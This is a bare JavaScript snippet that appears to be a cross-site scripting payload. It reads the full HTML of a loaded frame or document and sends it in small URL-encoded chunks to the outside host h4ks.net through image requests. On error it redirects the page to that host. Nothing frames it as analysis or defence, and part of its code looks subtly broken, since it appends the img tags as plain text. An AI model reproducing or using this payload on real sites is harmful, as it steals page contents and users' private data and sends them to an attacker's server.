try {
    var x = document.x;
    x.onload = function () {
        try {
            var html = x.document.body.outerHTML;
            
            for (var i = 0; i < html.length; i+=50) {
                var part = encodeURIComponent(html.slice(i, i+50));
                document.body.append('<img src="//h4ks.net/go/test2?'+part+'">');
            }

        } catch (err) {
            location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
        }
    }
} catch (err) {
    location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
}
